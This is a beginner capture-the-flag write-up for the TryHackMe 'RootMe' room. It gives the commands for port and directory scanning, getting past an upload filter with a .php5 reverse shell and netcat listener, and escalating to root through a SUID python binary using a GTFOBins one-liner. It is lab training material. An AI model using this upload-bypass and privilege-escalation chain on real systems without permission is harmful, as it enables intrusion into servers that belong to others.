# TryHackMe - RootMe

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Easy  
**Category:** Web, Linux, SUID  
**Room:** [RootMe](https://tryhackme.com/room/rrootme)

## Introduction

> *A CTF for beginners — can you root me?*

RootMe is structured as **four tasks**: deploy the machine, reconnaissance with quiz questions, getting a shell via file upload, and privilege escalation through a misconfigured SUID binary.

**Objectives:**
- Answer reconnaissance questions (ports, services, hidden directory)
- Obtain `user.txt` (Task 3)
- Escalate to root and obtain `root.txt` (Task 4)

---

## Task 1 — Deploy the Machine

Start the machine from the TryHackMe room page and connect via VPN or AttackBox. No answer required.

---

## Task 2 — Reconnaissance

A service scan maps the attack surface before touching the web application.

### Nmap

Nmap with version detection and default scripts identifies open ports and service versions:

```bash
nmap -sC -sV <TARGET_IP>
```

Typical results:

```
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
```

| Question | How to find it |
|----------|----------------|
| How many ports are open? | Count open ports in nmap output → **`2`** |
| Apache version? | See below — **must come from your own scan** |
| Service on port 22? | **`ssh`** (lowercase often required on THM) |

Port 80 is the primary foothold; SSH is not the intended initial access vector.

#### Apache version — read it from YOUR machine

Do **not** guess from write-ups. The version can differ between deployments. Run:

```bash
nmap -sV -p 80 <TARGET_IP>
```

Or read the HTTP `Server` header:

```bash
curl -sI http://<TARGET_IP>/ | grep -i server
```

Example output:

```
Server: Apache/2.4.41 (Ubuntu)
```

Submit **only the version number** from your scan (e.g. `2.4.41` or `2.4.29` depending on deployment).

### Directory discovery — Gobuster

Gobuster brute-forces hidden paths on the web root:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Notable findings:

| Path | Notes |
|------|-------|
| `/panel/` | File upload form — RCE vector |
| `/uploads/` | Stored uploads are served from here |
| `/css/`, `/js/` | Static assets (not useful) |

| Question | Answer |
|----------|--------|
| Hidden directory? | **`/panel/`** |

---

## Task 3 — Getting a Shell

### Upload filter bypass

The form at `/panel/` blocks plain `.php` uploads. The server validates file extensions — alternate PHP handlers still parsed by Apache are accepted.

Common working extensions: **`.php5`**, `.phtml`, `.php3`

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5
# Edit $ip and $port (LHOST / LPORT)
```

Other bypass attempts if extension change alone fails:
- Burp Suite: change `Content-Type` to `image/png` (may not work if only extension is checked)

### Reverse shell

Start a listener:

```bash
nc -lvnp 1234
```

Upload via `/panel/`, then browse the uploaded file:

```
http://<TARGET_IP>/uploads/shell.php5
```

Shell connects as **`www-data`**.

### Upgrade the shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

### User flag

```bash
find / -name user.txt 2>/dev/null
cat /var/www/user.txt
```

Submit on TryHackMe (Task 3).

---

## Task 4 — Privilege Escalation

### SUID enumeration

Search for binaries owned by root with the SUID bit set:

```bash
find / -user root -perm /4000 2>/dev/null
```

Most results are standard system binaries. The unusual entry is **`/usr/bin/python2.7`** (or `/usr/bin/python` on older instances) — a scripting interpreter should not normally be SUID.

| Question | Answer formats to try |
|----------|----------------------|
| Which SUID file is weird? | **`python2.7`**, **`/usr/bin/python2.7`**, or **`python`** |

### Exploit via GTFOBins

Reference: [GTFOBins — python (SUID)](https://gtfobins.github.io/gtfobins/python/#sudo)

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

*(Use `python` instead of `python2.7` if that is what your SUID enumeration shows.)*

Verify effective root:

```bash
id
# euid=0(root)
```

### Root flag

```bash
find / -name root.txt 2>/dev/null
cat /root/root.txt
```

Submit on TryHackMe (Task 4).

---

## Flags & Answers

| Task | Question | Notes |
|------|----------|-------|
| 2 | Ports open | `2` |
| 2 | Apache version | From **your** nmap / `curl -sI` — not a fixed write-up value |
| 2 | Service on port 22 | `ssh` |
| 2 | Hidden directory | `/panel/` |
| 3 | user.txt | Complete the room |
| **4** | Weird SUID file | `/usr/bin/python` *(Task 4, not Task 1)* |
| 4 | root.txt | Complete the room |

*Flag values are intentionally omitted from this published write-up. Complete the room on [TryHackMe](https://tryhackme.com/room/rrootme).*

---

## Conclusion

### What I learned

| Technique | Takeaway |
|-----------|----------|
| Nmap `-sV` | Answers recon quiz questions directly |
| Gobuster | Finds `/panel/` and `/uploads/` |
| Upload bypass | `.php5` / `.phtml` when `.php` is blocked |
| SUID hunt | `find / -user root -perm /4000` |
| GTFOBins (python) | SUID python → root shell via `os.execl` |

Classic beginner chain: scan → enumerate → upload shell → SUID python → root.
